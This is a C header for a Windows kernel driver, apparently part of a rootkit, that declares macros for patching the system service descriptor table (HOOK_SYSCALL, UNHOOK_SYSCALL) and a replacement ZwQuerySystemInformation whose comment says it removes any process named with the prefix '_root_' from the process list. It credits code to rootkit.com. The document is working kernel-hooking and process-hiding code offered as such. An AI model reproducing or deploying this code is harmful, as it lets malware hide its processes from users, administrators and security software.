#ifndef _HOOKSSDT_H
#define _HOOKSSDT_H

#include "kernellib.h"



unsigned __int64 __readmsr(int);

#pragma pack(1)
typedef struct ServiceDescriptorEntry {
	unsigned int *ServiceTableBase;
	unsigned int *ServiceCounterTableBase; //Used only in checked build
	unsigned int NumberOfServices;
	unsigned char *ParamTableBase;
} ServiceDescriptorTableEntry_t, *PServiceDescriptorTableEntry_t;
#pragma pack()

#define SEARCH_RANGE 0x170

//__declspec(dllimport)  ServiceDescriptorTableEntry_t KeServiceDescriptorTable;
ServiceDescriptorTableEntry_t KeServiceDescriptorTable, KeServiceDescriptorTableShadow;
#define SYSTEMSERVICE(_function)  (PUCHAR)KeServiceDescriptorTable.ServiceTableBase + ((LONG)KeServiceDescriptorTable.ServiceTableBase[*(PULONG)((PUCHAR)_function + 21)] >> 4)


PMDL  g_pmdlSystemCall;
PULONG MappedSystemCallTable;
#define SYSCALL_INDEX(_Function) *(PULONG)((PUCHAR)_Function+ 21)
#define HOOK_SYSCALL(_Function, _Hook, _Orig )  \
	_Orig = (PVOID)InterlockedExchange((PLONG)&MappedSystemCallTable[SYSCALL_INDEX(_Function)], (LONG)(((PUCHAR)_Hook - KeServiceDescriptorTable.ServiceTableBase) << 4))

#define UNHOOK_SYSCALL(_Function, _Hook, _Orig )  \
	InterlockedExchange((PLONG)&MappedSystemCallTable[SYSCALL_INDEX(_Function)], (LONG)_Hook)

struct _SYSTEM_THREADS
{
	LARGE_INTEGER           KernelTime;
	LARGE_INTEGER           UserTime;
	LARGE_INTEGER           CreateTime;
	ULONG                           WaitTime;
	PVOID                           StartAddress;
	CLIENT_ID                       ClientIs;
	KPRIORITY                       Priority;
	KPRIORITY                       BasePriority;
	ULONG                           ContextSwitchCount;
	ULONG                           ThreadState;
	KWAIT_REASON            WaitReason;
};

struct _SYSTEM_PROCESSES
{
	ULONG                           NextEntryDelta;
	ULONG                           ThreadCount;
	ULONG                           Reserved[6];
	LARGE_INTEGER           CreateTime;
	LARGE_INTEGER           UserTime;
	LARGE_INTEGER           KernelTime;
	UNICODE_STRING          ProcessName;
	KPRIORITY                       BasePriority;
	ULONG                           ProcessId;
	ULONG                           InheritedFromProcessId;
	ULONG                           HandleCount;
	ULONG                           Reserved2[2];
	VM_COUNTERS                     VmCounters;
	IO_COUNTERS                     IoCounters; //windows 2000 only
	struct _SYSTEM_THREADS          Threads[1];
};

// Added by Creative of rootkit.com
struct _SYSTEM_PROCESSOR_TIMES
{
	LARGE_INTEGER					IdleTime;
	LARGE_INTEGER					KernelTime;
	LARGE_INTEGER					UserTime;
	LARGE_INTEGER					DpcTime;
	LARGE_INTEGER					InterruptTime;
	ULONG							InterruptCount;
};

NTSYSAPI NTSTATUS NTAPI ZwQuerySystemInformation(IN ULONG SystemInformationClass, IN PVOID SystemInformation, IN ULONG SystemInformationLength, OUT PULONG ReturnLength);

typedef NTSTATUS(*ZWQUERYSYSTEMINFORMATION)(ULONG SystemInformationCLass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);

ZWQUERYSYSTEMINFORMATION        OldZwQuerySystemInformation;

// Added by Creative of rootkit.com
LARGE_INTEGER					m_UserTime;
LARGE_INTEGER					m_KernelTime;

///////////////////////////////////////////////////////////////////////
// NewZwQuerySystemInformation function
//
// ZwQuerySystemInformation() returns a linked list of processes.
// The function below imitates it, except it removes from the list any
// process who's name begins with "_root_".

NTSTATUS NewZwQuerySystemInformation(
	IN ULONG SystemInformationClass,
	IN PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength);

NTSTATUS Hp_Onload(IN PDRIVER_OBJECT theDriverObject, IN PUNICODE_STRING theRegistryPath);
VOID Hp_OnUnload(IN PDRIVER_OBJECT DriverObject);

#endif